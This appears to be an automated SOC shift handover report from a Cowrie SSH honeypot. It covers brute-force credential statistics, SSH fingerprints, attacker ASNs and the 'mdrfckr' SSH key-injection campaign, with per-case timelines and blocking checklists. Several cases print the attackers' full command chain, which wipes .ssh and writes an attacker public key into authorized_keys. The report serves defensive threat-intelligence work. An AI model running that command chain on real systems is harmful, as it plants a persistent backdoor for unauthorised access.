# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-17 |
| **Generated At** | 2026-04-17T16:58:38Z |
| **Shift Time** | 16:58 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **79** |
| Confirmed Threats | **78** |
| False Positives Filtered | **1** (1.3%) |
| Unique Attacker IPs | **8** |
| Countries of Origin | **5** |
| High Severity Cases | **22** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **57** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **52** |
| Unique Credential Pairs | **32** |
| Unique Usernames | **16** |
| Unique Passwords | **32** |
| Successful Auth Pairs | **15** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 22 |
| `345gs5662d34` | 10 |
| `admin` | 3 |
| `ali` | 2 |
| `user` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 11 |
| `345gs5662d34` | 10 |
| `qazwsx888!!` | 2 |
| `qwerty123` | 1 |
| `1234` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 11 |
| `345gs5662d34` | `345gs5662d34` | 10 |
| `root` | `qazwsx888!!` | 2 |
| `admin` | `qwerty123` | 1 |
| `ftptest` | `1234` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qazwsx888!!` | `102.213.34.99` | 2026-04-17T16:07:48 |
| `root` | `3245gs5662d34` | `102.213.34.99` | 2026-04-17T16:07:54 |
| `root` | `AAA123aaa` | `38.137.11.14` | 2026-04-17T16:09:48 |
| `root` | `3245gs5662d34` | `38.137.11.14` | 2026-04-17T16:09:50 |
| `root` | `ZAQ!2wsx4321@123` | `14.103.118.140` | 2026-04-17T16:10:31 |
| `root` | `3245gs5662d34` | `14.103.118.140` | 2026-04-17T16:10:35 |
| `root` | `Root21!` | `38.137.11.14` | 2026-04-17T16:12:30 |
| `root` | `Qazwsx123#` | `38.137.11.14` | 2026-04-17T16:13:52 |
| `root` | `root2026#$` | `38.137.11.14` | 2026-04-17T16:15:11 |
| `root` | `Qazwsx111111` | `38.137.11.14` | 2026-04-17T16:15:52 |
| `root` | `qazwsx888!!` | `38.137.11.14` | 2026-04-17T16:17:57 |
| `root` | `test2024` | `38.137.11.14` | 2026-04-17T16:22:02 |
| `root` | `Test12345` | `58.33.97.119` | 2026-04-17T16:22:14 |
| `root` | `3245gs5662d34` | `58.33.97.119` | 2026-04-17T16:22:22 |
| `root` | `Alibaba@123` | `38.137.11.14` | 2026-04-17T16:23:28 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **79** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 75 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 74 | 4 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 74 | 4 | Modern SSH client |
| `95420f9d932d...` | libssh | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 11 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `14.103.118.140`, `38.137.11.14`, `58.33.97.119`, `102.213.34.99`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **8** |
| Unique ASNs | **8** |
| High-Risk ASNs | **7** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS328154` | NETSPACE -SERVICOS DE TELECOMUNICACOES, LDA | 1 | HIGH |
| `AS4713` | NTT DOCOMO BUSINESS,Inc. | 1 | HIGH |
| `AS140527` | China Telecom | 1 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 1 | HIGH |
| `AS133661` | Netplus Broadband Services Private Limited | 1 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |
| `AS4812` | China Telecom (Group) | 1 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (22)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-745c6bb9109b

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-04-17 16:07 |
| **Last Seen** | 2026-04-17 16:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 16:07:46` | `cowrie.session.connect` |
| `2026-04-17 16:07:46` | `cowrie.client.version` |
| `2026-04-17 16:07:46` | `cowrie.client.kex` |
| `2026-04-17 16:07:48` | `cowrie.login.success` |
| `2026-04-17 16:07:48` | `cowrie.session.params` |
| `2026-04-17 16:07:48` | `cowrie.command.input` |
| `2026-04-17 16:07:48` | `cowrie.command.failed` |
| `2026-04-17 16:07:49` | `cowrie.log.closed` |
| `2026-04-17 16:07:49` | `cowrie.session.params` |
| `2026-04-17 16:07:49` | `cowrie.command.input` |
| `2026-04-17 16:07:50` | `cowrie.session.file_download` |
| `2026-04-17 16:07:50` | `cowrie.log.closed` |
| `2026-04-17 16:07:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5689226be0a

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-04-17 16:07 |
| **Last Seen** | 2026-04-17 16:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 16:07:53` | `cowrie.session.connect` |
| `2026-04-17 16:07:53` | `cowrie.client.version` |
| `2026-04-17 16:07:53` | `cowrie.client.kex` |
| `2026-04-17 16:07:54` | `cowrie.login.success` |
| `2026-04-17 16:07:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21c432ccf229

| Field | Detail |
|---|---|
| **Source IP** | `38.137.11[.]14` |
| **First Seen** | 2026-04-17 16:09 |
| **Last Seen** | 2026-04-17 16:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 16:09:48` | `cowrie.session.connect` |
| `2026-04-17 16:09:48` | `cowrie.client.version` |
| `2026-04-17 16:09:48` | `cowrie.client.kex` |
| `2026-04-17 16:09:48` | `cowrie.login.success` |
| `2026-04-17 16:09:48` | `cowrie.session.params` |
| `2026-04-17 16:09:48` | `cowrie.command.input` |
| `2026-04-17 16:09:48` | `cowrie.command.failed` |
| `2026-04-17 16:09:48` | `cowrie.log.closed` |
| `2026-04-17 16:09:48` | `cowrie.session.params` |
| `2026-04-17 16:09:48` | `cowrie.command.input` |
| `2026-04-17 16:09:48` | `cowrie.session.file_download` |
| `2026-04-17 16:09:48` | `cowrie.log.closed` |
| `2026-04-17 16:09:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.137.11[.]14` to AbuseIPDB if not already reported
- [ ] Block `38.137.11[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb4521dcc63e

| Field | Detail |
|---|---|
| **Source IP** | `38.137.11[.]14` |
| **First Seen** | 2026-04-17 16:09 |
| **Last Seen** | 2026-04-17 16:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 16:09:50` | `cowrie.session.connect` |
| `2026-04-17 16:09:50` | `cowrie.client.version` |
| `2026-04-17 16:09:50` | `cowrie.client.kex` |
| `2026-04-17 16:09:50` | `cowrie.login.success` |
| `2026-04-17 16:09:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.137.11[.]14` to AbuseIPDB if not already reported
- [ ] Block `38.137.11[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1033036f4932

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]140` |
| **First Seen** | 2026-04-17 16:10 |
| **Last Seen** | 2026-04-17 16:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 16:10:31` | `cowrie.session.connect` |
| `2026-04-17 16:10:31` | `cowrie.client.version` |
| `2026-04-17 16:10:31` | `cowrie.client.kex` |
| `2026-04-17 16:10:31` | `cowrie.login.success` |
| `2026-04-17 16:10:31` | `cowrie.session.params` |
| `2026-04-17 16:10:31` | `cowrie.command.input` |
| `2026-04-17 16:10:31` | `cowrie.command.failed` |
| `2026-04-17 16:10:32` | `cowrie.log.closed` |
| `2026-04-17 16:10:32` | `cowrie.session.params` |
| `2026-04-17 16:10:32` | `cowrie.command.input` |
| `2026-04-17 16:10:32` | `cowrie.session.file_download` |
| `2026-04-17 16:10:32` | `cowrie.log.closed` |
| `2026-04-17 16:10:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]140` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4280e2c9b02

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]140` |
| **First Seen** | 2026-04-17 16:10 |
| **Last Seen** | 2026-04-17 16:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 16:10:34` | `cowrie.session.connect` |
| `2026-04-17 16:10:34` | `cowrie.client.version` |
| `2026-04-17 16:10:34` | `cowrie.client.kex` |
| `2026-04-17 16:10:35` | `cowrie.login.success` |
| `2026-04-17 16:10:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]140` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fe71b495e14

| Field | Detail |
|---|---|
| **Source IP** | `38.137.11[.]14` |
| **First Seen** | 2026-04-17 16:12 |
| **Last Seen** | 2026-04-17 16:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 16:12:29` | `cowrie.session.connect` |
| `2026-04-17 16:12:29` | `cowrie.client.version` |
| `2026-04-17 16:12:30` | `cowrie.client.kex` |
| `2026-04-17 16:12:30` | `cowrie.login.success` |
| `2026-04-17 16:12:30` | `cowrie.session.params` |
| `2026-04-17 16:12:30` | `cowrie.command.input` |
| `2026-04-17 16:12:30` | `cowrie.command.failed` |
| `2026-04-17 16:12:30` | `cowrie.log.closed` |
| `2026-04-17 16:12:30` | `cowrie.session.params` |
| `2026-04-17 16:12:30` | `cowrie.command.input` |
| `2026-04-17 16:12:30` | `cowrie.session.file_download` |
| `2026-04-17 16:12:30` | `cowrie.log.closed` |
| `2026-04-17 16:12:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.137.11[.]14` to AbuseIPDB if not already reported
- [ ] Block `38.137.11[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c118f4f1c114

| Field | Detail |
|---|---|
| **Source IP** | `38.137.11[.]14` |
| **First Seen** | 2026-04-17 16:12 |
| **Last Seen** | 2026-04-17 16:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 16:12:31` | `cowrie.session.connect` |
| `2026-04-17 16:12:31` | `cowrie.client.version` |
| `2026-04-17 16:12:31` | `cowrie.client.kex` |
| `2026-04-17 16:12:32` | `cowrie.login.success` |
| `2026-04-17 16:12:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.137.11[.]14` to AbuseIPDB if not already reported
- [ ] Block `38.137.11[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ceb7d9146732

| Field | Detail |
|---|---|
| **Source IP** | `38.137.11[.]14` |
| **First Seen** | 2026-04-17 16:13 |
| **Last Seen** | 2026-04-17 16:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 16:13:52` | `cowrie.session.connect` |
| `2026-04-17 16:13:52` | `cowrie.client.version` |
| `2026-04-17 16:13:52` | `cowrie.client.kex` |
| `2026-04-17 16:13:52` | `cowrie.login.success` |
| `2026-04-17 16:13:52` | `cowrie.session.params` |
| `2026-04-17 16:13:52` | `cowrie.command.input` |
| `2026-04-17 16:13:52` | `cowrie.command.failed` |
| `2026-04-17 16:13:52` | `cowrie.log.closed` |
| `2026-04-17 16:13:52` | `cowrie.session.params` |
| `2026-04-17 16:13:52` | `cowrie.command.input` |
| `2026-04-17 16:13:52` | `cowrie.session.file_download` |
| `2026-04-17 16:13:52` | `cowrie.log.closed` |
| `2026-04-17 16:13:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.137.11[.]14` to AbuseIPDB if not already reported
- [ ] Block `38.137.11[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bde67d11532b

| Field | Detail |
|---|---|
| **Source IP** | `38.137.11[.]14` |
| **First Seen** | 2026-04-17 16:13 |
| **Last Seen** | 2026-04-17 16:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 16:13:54` | `cowrie.session.connect` |
| `2026-04-17 16:13:54` | `cowrie.client.version` |
| `2026-04-17 16:13:54` | `cowrie.client.kex` |
| `2026-04-17 16:13:54` | `cowrie.login.success` |
| `2026-04-17 16:13:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.137.11[.]14` to AbuseIPDB if not already reported
- [ ] Block `38.137.11[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4eff005f9beb

| Field | Detail |
|---|---|
| **Source IP** | `38.137.11[.]14` |
| **First Seen** | 2026-04-17 16:15 |
| **Last Seen** | 2026-04-17 16:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 16:15:11` | `cowrie.session.connect` |
| `2026-04-17 16:15:11` | `cowrie.client.version` |
| `2026-04-17 16:15:11` | `cowrie.client.kex` |
| `2026-04-17 16:15:11` | `cowrie.login.success` |
| `2026-04-17 16:15:11` | `cowrie.session.params` |
| `2026-04-17 16:15:11` | `cowrie.command.input` |
| `2026-04-17 16:15:11` | `cowrie.command.failed` |
| `2026-04-17 16:15:11` | `cowrie.log.closed` |
| `2026-04-17 16:15:11` | `cowrie.session.params` |
| `2026-04-17 16:15:11` | `cowrie.command.input` |
| `2026-04-17 16:15:11` | `cowrie.session.file_download` |
| `2026-04-17 16:15:11` | `cowrie.log.closed` |
| `2026-04-17 16:15:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.137.11[.]14` to AbuseIPDB if not already reported
- [ ] Block `38.137.11[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2424d53e68d4

| Field | Detail |
|---|---|
| **Source IP** | `38.137.11[.]14` |
| **First Seen** | 2026-04-17 16:15 |
| **Last Seen** | 2026-04-17 16:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 16:15:12` | `cowrie.session.connect` |
| `2026-04-17 16:15:12` | `cowrie.client.version` |
| `2026-04-17 16:15:12` | `cowrie.client.kex` |
| `2026-04-17 16:15:13` | `cowrie.login.success` |
| `2026-04-17 16:15:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.137.11[.]14` to AbuseIPDB if not already reported
- [ ] Block `38.137.11[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8c9fbc1e4b5

| Field | Detail |
|---|---|
| **Source IP** | `38.137.11[.]14` |
| **First Seen** | 2026-04-17 16:15 |
| **Last Seen** | 2026-04-17 16:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 16:15:52` | `cowrie.session.connect` |
| `2026-04-17 16:15:52` | `cowrie.client.version` |
| `2026-04-17 16:15:52` | `cowrie.client.kex` |
| `2026-04-17 16:15:52` | `cowrie.login.success` |
| `2026-04-17 16:15:52` | `cowrie.session.params` |
| `2026-04-17 16:15:52` | `cowrie.command.input` |
| `2026-04-17 16:15:52` | `cowrie.command.failed` |
| `2026-04-17 16:15:52` | `cowrie.log.closed` |
| `2026-04-17 16:15:52` | `cowrie.session.params` |
| `2026-04-17 16:15:52` | `cowrie.command.input` |
| `2026-04-17 16:15:52` | `cowrie.session.file_download` |
| `2026-04-17 16:15:52` | `cowrie.log.closed` |
| `2026-04-17 16:15:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.137.11[.]14` to AbuseIPDB if not already reported
- [ ] Block `38.137.11[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

